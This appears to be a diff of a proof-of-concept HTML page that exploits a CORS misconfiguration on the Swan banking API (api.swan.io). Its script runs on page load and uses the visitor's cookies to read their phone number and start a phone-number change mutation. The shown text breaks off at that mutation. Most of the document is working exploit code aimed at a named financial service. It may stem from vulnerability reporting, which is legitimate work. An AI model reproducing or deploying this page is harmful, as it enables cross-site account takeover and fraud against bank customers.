@@ -1,16 +1,3 @@
-- ### Why your earlier test “didn’t work”
-+ ### Why previous attempts failed
-
-1. **No `api.swan.io` cookie present** → GraphQL returned “Forbidden”.  
-2. **Invalid dummy new number format** → fallback new number didn’t comply with E.164, so server returned 400.  
-
-Neither issue affects the core finding: **any Origin** is reflected and **credentials** are allowed, so admin-only mutations can be invoked cross-site.
-
----
-
-## Bullet-proof PoC: `index.html`
-
-```html
 <!DOCTYPE html>
 <meta charset="utf-8">
 <title>Swan CORS Critical PoC</title>
@@ -18,19 +5,17 @@ Neither issue affects the core finding: **any Origin** is reflected and **creden
   body { font-family: system-ui; margin: 2rem; color: #111 }
   pre  { background: #f8f8f8; padding: 1rem; border: 1px solid #e1e1e1; overflow: auto }
   code { color: #c7254e; background: #f9f2f4 }
-  .success { color: green }
-  .error   { color: red }
 </style>
 
 <h2>⚠️ Swan Banking – Critical CORS Misconfiguration PoC ⚠️</h2>
 <p>This page is served from <strong id="origin"></strong>.  
-All requests below run <em>automatically</em> with your <code>api.swan.io</code> cookies
-(no JWT, no custom header).</p>
+All requests below run <em>automatically</em> with your <code>api.swan.io</code> cookies  
+(no JWT, no custom header)</p>
 
 <pre id="log">Running…</pre>
 
 <script>
-  const log = line => document.getElementById('log').textContent += line + '\n';
+  const log = l => document.getElementById('log').textContent += l + '\n';
   document.getElementById('origin').textContent = location.origin;
 
   async function gql(path, query) {
@@ -40,28 +25,28 @@ All requests below run <em>automatically</em> with your <code>api.swan.io</code>
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ query })
     });
-    const text = await res.text();
-    log(`=== ${path} ===\nStatus: ${res.status} ${res.statusText}\n${text}\n`);
-    return { status: res.status, data: JSON.parse(text).data };
+    const txt = await res.text();
+    log(`=== ${path} ===\nStatus: ${res.status} ${res.statusText}\n${txt}\n`);
+    return { status: res.status, data: JSON.parse(txt).data };
   }
 
   (async () => {
-    // 1) Try to read victim’s phone
+    // 1) Try to read the victim’s phone
     let oldN = '+33600000002';
     const whoami = await gql('/admin-auth/graphql', '{ user { mobilePhoneNumber } }');
     if (whoami.status === 200 && whoami.data && whoami.data.user) {
       oldN = whoami.data.user.mobilePhoneNumber;
       log(`✅ Read victim’s phone: ${oldN}\n`);
     } else {
-      log(`⚠️ Could not read phone (unauthenticated) – using dummy: ${oldN}\n`);
+      log(`⚠️ Could not read phone (no cookie) – using dummy: ${oldN}\n`);
     }
 
-    // 2) Generate a valid new number: +33 6 XXXXXXXX (8 digits)
-    const rand8 = () => Math.floor(10000000 + Math.random() * 90000000);
-    const newN = '+336' + String(rand8()).slice(1);
-    log(`▶ Attempting change from ${oldN} → ${newN}\n`);
+    // 2) Generate a valid new number: +33 6XXXXXXXX (8 digits)
+    const rand8 = () => Math.floor(10_000_000 + Math.random() * 90_000_000);
+    const newN  = '+336' + String(rand8()).slice(1);
+    log(`▶ Changing from ${oldN} → ${newN}\n`);
 
-    // 3) Queue the phone-change mutation
+    // 3) Queue phone-change mutation
     const mut = `
       mutation {
         startPhoneNumberModification(input:{
